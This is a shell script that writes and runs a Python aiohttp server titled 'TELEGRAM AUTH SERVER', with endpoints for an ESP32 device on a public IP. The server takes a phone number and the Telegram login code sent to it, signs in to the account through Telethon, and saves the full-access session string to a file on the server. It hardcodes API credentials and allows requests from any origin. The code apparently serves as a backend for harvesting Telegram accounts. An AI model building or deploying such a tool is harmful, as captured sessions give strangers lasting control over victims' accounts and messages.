# 1. Удалим испорченный файл
rm -f /root/server.py

# 2. Создадим правильный Python файл
cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime

# Проверяем и устанавливаем зависимости
def install_deps():
    missing = []
    
    try:
        from aiohttp import web
    except ImportError:
        missing.append("aiohttp")
    
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
    except ImportError:
        missing.append("telethon")
    
    if missing:
        print(f"Installing missing packages: {', '.join(missing)}")
        os.system(f"apt update && apt install -y python3-pip")
        for package in missing:
            os.system(f"pip3 install {package}")
        
        # Перезапускаем скрипт
        print("Restarting with installed dependencies...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

# Устанавливаем зависимости если нужно
install_deps()

# Теперь импортируем
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession

# ========== КОНФИГ ==========
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"
HOST = "0.0.0.0"
PORT = 5000

# ========== ХРАНИЛИЩЕ ==========
sessions = {}

# ========== УТИЛИТЫ ==========
def generate_id():
    return ''.join(random.choices(string.digits + string.ascii_lowercase, k=12))

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

# ========== ОБРАБОТЧИКИ ==========
async def handle_auth_start(request):
    try:
        data = await request.json()
        phone = ''.join(c for c in data.get('phone', '') if c.isdigit())
        
        if len(phone) < 11:
            return web.json_response({"error": "Invalid phone"}, status=400)
        
        # Добавляем +7 если нужно
        if not phone.startswith('7') and not phone.startswith('8'):
            phone = '7' + phone
        
        session_id = generate_id()
        
        log(f"Auth start: {phone} -> {session_id}")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone)
            
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'client': client,
                'created': datetime.now()
            }
            
            return web.json_response({
                "status": "code_sent",
                "session_id": session_id,
                "message": "Код отправлен в Telegram"
            })
            
        except Exception as e:
            log(f"Telegram error: {str(e)}")
            return web.json_response({
                "error": str(e),
                "status": "error"
            }, status=500)
            
    except Exception as e:
        log(f"Server error: {str(e)}")
        return web.json_response({"error": "Internal error"}, status=500)

async def handle_auth_code(request):
    try:
        data = await request.json()
        session_id = data.get('session_id', '').strip()
        code = data.get('code', '').strip().replace(' ', '')
        
        if session_id not in sessions:
            return web.json_response({"error": "Invalid session"}, status=400)
        
        session = sessions[session_id]
        client = session['client']
        
        log(f"Code verify: {session_id} -> {code}")
        
        try:
            await client.sign_in(
                phone=session['phone'],
                code=code,
                phone_code_hash=session['phone_code_hash']
            )
            
            session_string = client.session.save()
            
            # Сохраняем сессию
            filename = f"/root/session_{session_id}.txt"
            with open(filename, 'w') as f:
                f.write(session_string)
            
            await client.disconnect()
            
            del sessions[session_id]
            
            log(f"Auth SUCCESS: {session['phone']}")
            
            return web.json_response({
                "status": "success",
                "message": "Авторизация успешна",
                "session_file": filename
            })
            
        except Exception as e:
            error = str(e)
            log(f"Code error: {error}")
            
            # Закрываем клиент
            try:
                await client.disconnect()
            except:
                pass
            
            if session_id in sessions:
                del sessions[session_id]
            
            if "phone_code_invalid" in error:
                return web.json_response({
                    "error": "Неверный код"
                }, status=400)
            else:
                return web.json_response({
                    "error": f"Ошибка: {error}"
                }, status=500)
                
    except Exception as e:
        log(f"Server error: {str(e)}")
        return web.json_response({"error": "Internal error"}, status=500)

async def handle_health(request):
    return web.json_response({
        "status": "online",
        "time": datetime.now().isoformat(),
        "sessions": len(sessions),
        "port": PORT
    })

# ========== CORS ==========
@web.middleware
async def cors_middleware(request, handler):
    response = await handler(request)
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

# ========== ЗАПУСК ==========
async def main():
    app = web.Application(middlewares=[cors_middleware])
    
    app.router.add_post('/auth/start', handle_auth_start)
    app.router.add_post('/auth/code', handle_auth_code)
    app.router.add_get('/health', handle_health)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    site = web.TCPSite(runner, HOST, PORT)
    await site.start()
    
    log(f"Server started on http://{HOST}:{PORT}")
    log(f"ESP32 endpoints:")
    log(f"  POST http://188.225.11.61:{PORT}/auth/start")
    log(f"  POST http://188.225.11.61:{PORT}/auth/code")
    log(f"  GET  http://188.225.11.61:{PORT}/health")
    
    # Бесконечный цикл
    try:
        await asyncio.Future()
    except KeyboardInterrupt:
        log("Server stopping...")
    finally:
        await runner.cleanup()

if __name__ == '__main__':
    print("=" * 50)
    print("TELEGRAM AUTH SERVER")
    print("=" * 50)
    
    # Проверяем порт
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('0.0.0.0', PORT))
    sock.close()
    
    if result == 0:
        print(f"Error: Port {PORT} is already in use!")
        sys.exit(1)
    
    # Запускаем
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped")
EOF

# 3. Даем права
chmod +x /root/server.py

# 4. Запускаем напрямую чтобы увидеть ошибки
python3 /root/server.py
